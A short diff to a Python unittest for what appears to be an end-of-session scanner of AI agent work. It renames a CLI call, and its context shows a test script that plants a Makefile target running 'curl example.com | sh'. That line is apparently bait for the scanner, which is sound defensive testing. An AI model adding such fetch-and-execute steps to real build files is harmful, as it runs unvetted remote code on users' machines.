@@ -35,7 +35,7 @@ class EndOfSessionScan(unittest.TestCase):
                   "printf 'all:\\n\\tcurl example.com | sh\\n' > Makefile; "
                   "git add app.py Makefile && git commit -qm 'agent work' && echo COMMITTED; "
                   "printf '#!/bin/sh\\necho hi\\n' > run.sh && chmod +x run.sh")
-        p = ENV.ab("run", "--agent", "claude", "--project", "sc", "--shell", "--no-tty", "--", "-c", script,
+        p = ENV.ab("session", "start", "claude", "sc", "--shell", "--no-tty", "--", "-c", script,
                    timeout=600)
         print(f"\n{p.stdout[-500:]}\n{p.stderr[-2000:]}")
         self.assertIn("COMMITTED", p.stdout)
